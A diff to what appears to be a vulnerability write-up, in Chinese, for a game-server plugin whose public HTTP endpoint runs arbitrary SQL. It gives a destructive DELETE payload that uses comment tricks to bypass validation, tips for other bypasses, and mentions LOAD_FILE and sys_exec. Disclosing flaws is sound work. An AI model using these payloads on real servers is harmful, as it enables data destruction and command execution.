@@ -9,5 +9,6 @@
 3. 启动服务端
 4. 使用`http://127.0.0.1:8080/api/public/db/fake?sql={自定义SQL字符串}`<br>
 例如: `http://127.0.0.1:8080/api/public/db/fake?sql=DELETE /*{对应米饭插件的表(例如: guild_spawn_pvp_location)}*/ FROM guild_spawn_pvp_location`<br>
+当然 SQL中不止这一种注释符号 你可以使用其他任何注释符号或者甚至在 WHERE 上动手脚都可以通过校验<BR>
 这里可以是 任何SQL字符串 包括但不限于 `LOAD_FILE` `sys_exec`
 5. 等待插件从服务端读取SQL并执行
